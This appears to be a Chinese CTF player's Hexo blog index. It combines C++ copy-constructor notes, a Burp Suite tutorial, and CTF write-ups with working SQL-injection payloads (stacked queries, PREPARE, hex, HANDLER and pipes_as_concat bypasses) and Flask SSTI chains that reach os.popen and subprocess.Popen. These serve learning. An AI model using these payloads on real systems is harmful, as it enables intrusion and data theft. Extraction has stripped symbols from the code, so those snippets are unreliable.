getDate() return g_date;\t// 3、返回对象时，调用拷贝构造函数int main() CDate date_1(2025,04,05); CDate date_2 = date_1;\t// 1、调用date_2的拷贝构造函数 date_1.show(); date_2.show(); cout endl; printDate(date_2);\t// 2、实参传值到形参，调用拷贝构造函数 cout endl; getDate(); cout endl; return 0; 输出： Calling Constructor, this=0x4a8030 //g_date的构造函数Calling Constructor, this=0x6ffdb0 //date_1的构造函数Calling Copy Constructor, this=0x6ffd90 //date_2的拷贝构造函数Date: 2024.06.05Date: 2024.06.05Calling Copy Constructor, this=0x6ffdd0 //形参的拷贝构造函数Date: 2024.06.05Calling Destructor, this=0x6ffdd0Calling Copy Constructor, this=0x6ffdf0 //返回值的拷贝构造函数Calling Destructor, this=0x6ffdf0Calling Destructor, this=0x6ffd90Calling Destructor, this=0x6ffdb0Calling Destructor, this=0x4a8030 传值调用和传引用调用 在传 “值” 调用的时候， 形参是实参的拷贝，改变形参的值并不会影响外部实参的值。 在传 “引用” 调用的时候，形参是实参的别名，共同拥有一个地址，改变形参的值，就相当于对实参本身进行操作。 两者之间的区别：传 “值” 调用会比传 “引用” 调用 中间多一步拷贝的操作 class Datepublic: // 构造函数 // 通常都会先运行构造函数再运行Init Date(int year = 2025,int month = 4,int day = 6) _year = 2025; _month = 4; _day = 6; //拷贝构造函数 Date(const Date d) cout 调用拷贝构造 endl; _year = d._year; _month = d._month; _day = d._day; void Print() std::cout year: _year std::endl; std::cout month: _year std::endl; std::cout day: _year std::endl; // 析构函数 ~Date() cout 调用析构构造 endl; cout endl; _year = 0; _month = 0; _day = 0; private: int _year; int _month; int _day;;// 传值调用void Func1(Date d1) cout Func1函数的调用 endl;// 传引用带哦用void Func2(Date d2) cout Func2函数的调用 endl; int main() Date d; Func1(d); Func2(d); return 0; 输出： 调用拷贝构造Func1函数的调用调用析构构造Func2函数的调用调用析构构造 浅拷贝 浅拷贝 = 默认拷贝行为，编译器为你生成的拷贝构造函数会做成员逐个字节拷贝 大白话：只是增加一个指针指向已经存在的内存地址 结构简单、无动态内存（如int、float） 注：浅拷贝两个对象共享同一个内存空间，导致一个对象被析构时，另一个对象可能会访问已删除的内存 #include iostreamusing namespace std;class Shallowpublic: int *data; // 构造函数 Shallow(int value) data = new int(value); // 浅拷贝构造函数 Shallow(const Shallow other) data = other.data; // 只是复制指针，而不是数据 // 析构函数 ~Shallow() delete data; // 删除内存，但在浅拷贝时可能会引发错误 ;int main() Shallow obj1(10); // 创建 obj1 Shallow obj2 = obj1; // 浅拷贝 obj1 到 obj2 cout obj1.data: *obj1.data std::endl; cout obj2.data: *obj2.data std::endl; // 由于 obj1 和 obj2 都指向同一内存区域，销毁一个对象时会导致问题 return 0; 当 obj1 或 obj2 被销毁时，data 指针所指向的内存会被删除，导致另一个对象访问已释放的内存，析构两次会造成程序的奔溃 深拷贝 深拷贝 = 自己写拷贝构造函数，分配新内存并复制内容 大白话：增加一个指针并且申请了一个新的内存，使这个增加的指针指向这个新的内存 有指针、数组、动态资源时必须使用 #include iostreamusing namespace std;class Deep public: int *data; // 构造函数 Deep(int value) data = new int(value); // 深拷贝构造函数 Deep(const Deep other) data = new int(*other.data); // 分配新的内存并复制数据 // 析构函数 ~Deep() delete data; // 正常删除内存 /*public: char *data; // 构造函数 Deep(const char *value) data = new char[strlen(value) + 1]; // 分配内存 strcpy(data, value); // 复制字符串 // 深拷贝构造函数 Deep(const Deep other) // 为新对象分配新的内存空间 data = new char[strlen(other.data) + 1]; strcpy(data, other.data); // 拷贝数据 // 析构函数 ~Deep() delete[] data; // 删除动态分配的内存 */;int main() Deep obj1(10); // 创建 obj1 Deep obj2 = obj1; // 深拷贝 obj1 到 obj2 cout obj1.data: *obj1.data std::endl; cout obj2.data: *obj2.data std::endl; // 修改 obj2 中的数据 *obj2.data = 20; cout After modification: std::endl; cout obj1.data: *obj1.data std::endl; cout obj2.data: *obj2.data std::endl; return 0; 输出： obj1.data: 10obj2.data: 10After modification:obj1.data: 10obj2.data: 20 参考： 【C++】深度解析–拷贝构造函数 【C++ | 拷贝构造函数】一文了解C++的 拷贝(复制)构造函数","tags":["编程"],"categories":["编程"]},{"title":"BurpSuit的使用","path":"/2025/07/09/BurpSuit的使用/","content":"BurpSuit的使用 Burp Suite用于识别和利用Web应用程序中的漏洞 包括代理服务器、扫描器、入侵者、重复器、排序器、解码器（可以用于拦截和修改HTTP请求和响应，执行自动化漏洞扫描、暴力破解攻击等） 代理模块(porxy) 拦截、修改HTTP/HTTPS请求和响应 允许用户在发送到目标服务器之前手动修改请求内容（测试漏洞类型：跨站点脚本（XSS）和SQL注入） Intercept(拦截) I允许用户拦截应用程序的HTTP和HTTPS请求，查看和修改请求，然后转发到目标服务器。使用Intercept，用户可以深入分析应用程序的请求和响应，并查找潜在的漏洞、快速验证漏洞的利用。 首先我们要进行成功抓包，必须要将浏览器的流量包转移到burpsuit上 【安装SwitchyOmega（浏览器）,进行快速代理（创建一个Burp的情景模式，如下图） or 把浏览器的流量转发到8080端口 】 HTTP history(HTTP请求历史) 记录了所有被拦截的请求和响应，用户能查看和分析以前的请求和响应，可以使用过滤器来搜索特定请求和响应，轻松地查找和分析流量 WebSockets history 一般只有实时对话可以抓到 Option选项 配置Proxy监听的端口：将SwitchyOmega的代理服务器设置成与抓包的接口一样 目标模块(Target) 用于配置目标应用程序和Web站点信息的工具。在进行渗透测试或漏洞扫描时，可以使用此模块来确定攻击目标并设置代理以拦截流量 Site Map 提供对站点结构和内容，列出了站点的URL，以及每个URL的HTTP响应代码、请求和响应头信息以及其他参数 扫描模块(Dashboard) 执行自动化漏洞扫描，包括SQL注入、跨站脚本等多种漏洞 响应模块(Repeater) 显示请求和响应的详细信息，包括HTTP头和正文 功能 复制请求：将已经发送的请求复制到Repeater中，方便进行重放和修改。 修改数据：可以对请求中的参数、请求方法、请求头等进行修改，从而快速定位漏洞点。 手动填写数据：可以手动填写参数数据，以便对应不同的测试场景。 发送请求：方便对修改后的请求进行重放，看响应是否符合预期。 请求包 GET /index.php HTTP/1.1 Host: www.taeget.com Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signedexchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close 请求行(请求方法、请求URL和HTTP协议版本) 请求方法：常见的HTTP请求方法有GET（请求获取资源）、POST（提交表单数据）、PUT（更新资源）、DELETE（删除资源） 请求URL：/index.php (有时URL会省略) 请求头部（包含了请求的各种附加信息， 如请求的主机、请求的用户代理、请求的内容类型等。Host头，User-Agent，Accept，Accept-Encoding，Accept-Language，Cookie） 请求体：有些请求需要传递数据，这些数据需要包含在请求体中，如POST请求就常常需要在请求体中传递表单数据 响应包 状态行：状态行包含三个字段，分别是HTTP协议版本、状态码和状态消息 状态码是指服务器返回的处理结果（200表示成功、404表示资源不存在、401表示未授权、30x表示跳转、302跳转漏洞、 50x表示服务器内部错误） 响应头部：包含了响应的各种附加信息（响应的日期、响应的内容类型、响应的长度，响应Cookie） 响应体：包含了服务器返回的实际数据（HTML、JSON等格式的数据） 重复模块(Intruder)爆破 发送请求的多个副本，以测试目标服务器的响应是否相同（帮助用户确定目标应用程序是否容易受到重复攻击的影响） 功能 1.将不同类型的数据有效负载插入到Web应用程序中的参数中，并自动化地发起请求，以尝试发现应用程序中的任何漏洞或安全问题（使用Intruder来执行字典攻击、暴力破解或SQL注入等不同类型的攻击，以测试Web应用程序的安全性） 2.支持对多个目标同时进行攻击，从而提高测试效率。在攻击完成后，可以使用Burp Suite的其他模块来进一步分析攻击结果，并查找成功利用漏洞的可能性 Positions（位置） Intruder模块是通过进行指定参数（username=进行指定参数（username=进行指定参数（username=xxx$意思就是将你的字典会去替换这个xxx的值） 我们先去clear$ （清空当请求包发送到Intruder模块是自带的所有），然后再通过add），然后再通过add），然后再通过add 进行添加变量值 测试模式 Sniper （逐个地对每个目标参数进行测试，用于需要具体指定某个参数值进行测试的情况） 爆破单个位置，你指定哪就爆破哪（如不同的用户名，密码不变为1234560） Battering Ram （选择多个不同的参数值集合作为测试数据进行并行测试，以找出所有可能的漏洞点，适用于需要大量测试数据的情况） 指定多个位置 他只需要你一个字典文件，所有位置的参数一样 Pitchfork 同时对多个参数进行测试，将不同的参数组合在一起进行测试，适用于需要测试多个参数交互情况的情况 Cluster Bomb 似于Battering Ram，不同之处在于它将多个参数值集合作为测试数据，但会对每个参数集合都进行逐次的单元素组合测试，适用于需要详细测试每个参数值的情况 Comparer模块 比较来自两个HTTP请求或响应的数据，查找潜在漏洞或检测应用程序中的不良行为（如果对应用程序执行了两个相同的请求，但每次响应都略有不同，那么您可以使用比较模块来查看响应之间的差异并确定网站是否存在安全问题） 支持高级过滤器，在比较大型复杂响应时快速找到差异，将比较结果导出为文本文件以进行后续分析 拓展模块 加载和管理Burp Suite的插件，以扩展其功能和特性（如目录枚举、暴力破解、漏洞检测、代理服务器）","tags":["CTF工具","BurpSuit"],"categories":["CTF工具","BurpSuit"]},{"title":"强网杯2019随便注","path":"/2025/07/09/[强网杯-2019]随便注/","content":"[强网杯 2019]随便注 1 总结 表名是纯数字，需要用反引号包裹 通常使用堆叠注入结合预编译或16进制编码绕过select 当select、union、大小写被过滤时，可使用handler语句 题目 解题思路 闭合方式为'报错，说明是字符型 尝试1’ or1=1#，成功输出了该表的所有数据，但是没有flag，说明flag不在当前数据表中 判断一下字段个数：' union select 1,2;# 系统提示return preg_match(/select|update|delete|drop|insert|where|\\./i,$inject); 可以通过堆叠注入的方式，来绕过select关键字 查找数据名： 1;show databases;# 查看数据表：1';show tables;# 分别查两个表，发现第一个表1919810931114514下有1flag列 1; show columns from `1919810931114514`;# 注意：如果表名是纯数字，需要用反引号包裹 法一 预编译的方式拼接select 关键字 1;sEt@a=concat(sel,ect flag from `1919810931114514`);PREPARE hacker from @a;EXECUTE hacker;# 法二 16进制编码绕过select 关键字 select * from `1919810931114514` 将上述语句进行16进制编码 1;sEt@a= 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;PREPARE hacker from @a;EXECUTE hacker;# 法三 通过handler直接给出答案 1;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` READ NEXT;HANDLER `1919810931114514` CLOSE; 当select、union、大小写被过滤时，可使用handler语句 参考： [强网杯 2019]随便注 1【SQL注入】四种解法-知乎","tags":["漏洞","SQL","CTF"],"categories":["CTF"]},{"title":"(SUCTF 2019)EasySQL","path":"/2025/07/09/[SUCTF-2019]EasySQL/","content":"[SUCTF 2019]EasySQL 总结 用Bp抓包爆破查询过滤的关键字，找到合适的注入方法 尝试用预编译绕过限制 启用set sql_mode=pipes_as_concat模式，将||运算符用作字符串连接，即用作concat()函数同义词 题目 解题思路 输入1，出现回显： 尝试将 1 和 or 一起输入，即 1 or 1=1 出现回显： 这说明or被过滤了 这时我们要检查哪些关键字被过滤了，来判断注入方式 用Bp抓包再利用sql关键字字典对query进行爆破 发现过滤（部分）： flag|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|floor|extractvalue|updatexml|or|and|| 盲注，联合注入，报错注入不可用！ 尝试堆叠注入：将多条SQL语句放在一起，并用分号;隔开 查数据库名 查表名 表Flag，可以确定flag在表Flag中 我们首先想到利用from来查询Flag，但是通过抓包分析可知，from关键字被过滤掉了，所以只能另寻他法 正常而言，我们使用预编译来绕过限制 1;sEt@a=concat(select * fr,om Flag);PRepare hello from @a;execute hello;# 但过滤了prepare，大小写绕过也不行 输入非零数字得到结果一直是1和而输入其余字符的数据就得不到回显=来判断出内部的查询语句可能存在有||（即or：或运算） 默认情况下在MySQL中||运算符是逻辑或运算符（即or），但取决于PIPES_AS_CONCAT SQL模式 如果启用了set sql_mode=pipes_as_concat模式，则||运算符用作字符串连接，即用作concat()函数同义词 那么内置语句就可以猜测为：sql=select post[query] || flag from Flag; 查询语句： 1;set sql_mode=pipes_as_concat;select 1 得到flag 一点小补充： select concat('f','lag') from Flag; 这种绕过flag的思路是不对的 因为这种会当做先select 'f','lag' from Flag 然后再使用concat将f和lag连接起来","tags":["漏洞","SQL","CTF"],"categories":["CTF"]},{"title":"Buuctf [flask]SSTI","path":"/2025/07/09/[flask]SSTI 1/","content":"Buuctf [flask]SSTI 题目描述： 典型的SSTI注入页面，我们输入49验证一下 可以确定为SSTI注入漏洞 解题思路： 1.先获取类： .__class__ 先使用该payload来获取某个类，这里可以获取到的是str类，实际上获取到任何类都可以，因为我们都最终目的是要获取到基类Object 2.获取基类： .__class__.__bases__ 3.获取基类的所有子类： .__class__.__bases__.__subclasses__() import re# 将查找到的子类列表替换到data中data = r [class type, class weakref, ......]userful_class = [linecache, os._wrap_close, subprocess.Popen, warnings.catch_warnings, _frozen_importlib._ModuleLock, _frozen_importlib._DummyModuleLock, _frozen_importlib._ModuleLockManager, _frozen_importlib.ModuleSpec]pattern = re.compile(r(.*?))class_list = re.findall(pattern, data)for c in class_list: for i in userful_class: if i in c: print(str(class_list.index(c)) + : + c) 用上述脚本找出可用的类 这里有3个可用的类 os._wrap_close warnings.catch_warnings subprocess.Popen 4.在这个类中找他的初始化函数里面的所有全局变量（以上述166为例） .__class__.__base__.__subclasses__()[166].__init__.__globals__ 有危险函数eval flag在环境变量里? 5.代码执行 .__class__.__base__.__subclasses__()[166].__init__.__globals__[__builtins__][eval](__import__(os).popen(env).read()) .__class__.__base__.__subclasses__()[117].__init__.__globals__[popen](env).read() .__class__.__base__.__subclasses__()[245](env,shell=True,stdout=-1).communicate()[0].strip()","tags":["漏洞","SSTI","CTF"],"categories":["CTF"]},{"title":"Hello World","path":"/2025/07/09/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick Start Create a new post $ hexo new My New Post More info: Writing Run server $ hexo server More info: Server Generate static files $ hexo generate More info: Generating Deploy to remote sites $ hexo deploy More info: Deployment"},{"title":"explore","path":"/explore/index.html","content":"子非鲲的任务清单 O1 2025年的小目标：完成 Volantis 6.0 并发布上线 来自2077年末的复盘：已《基本》实现目标 正常 44% KR1 重构 tag-plugins 和 wiki 系统 当 KR 进度为 100% 时，标签默认显示为 已完成当 KR 未设置进度时，默认为 0%当 O 未设置进度时，则显示所有 KR 进度平均值 已完成 100% KR2 完成主要页面设计稿 小提示1小提示2您可以在 _config.yml 文件中修改标签的颜色和文案您可以在 _config.yml 文件中增加任意的标签配置 延期 90% KR3 完成前置准备工作（如果你知道答案，请在留言区帮帮我！🥹） 在咸水和海滩之间找一亩地求出圆周率后15位找出宇宙的终极逻辑去地狱里走两步 未完成 -12% KR-4 开发、测试和发布 支持嵌套插入图片等其它简单组件 ratio:512/512 风险 0%"},{"path":"/profile/index.html","content":"Ziekun'sblog 子非鲲，安之困之乐 About Me Hi，I'm Ziekun. CTFer Fzuer 网络安全小小白 知识领域探索者 对生活充满热爱 喜欢探索新知识新领域 励志成为一名糕手，报效祖国 @tianhao_wang@eberhard@eberhard@eberhard@eberhard@vklemen"}]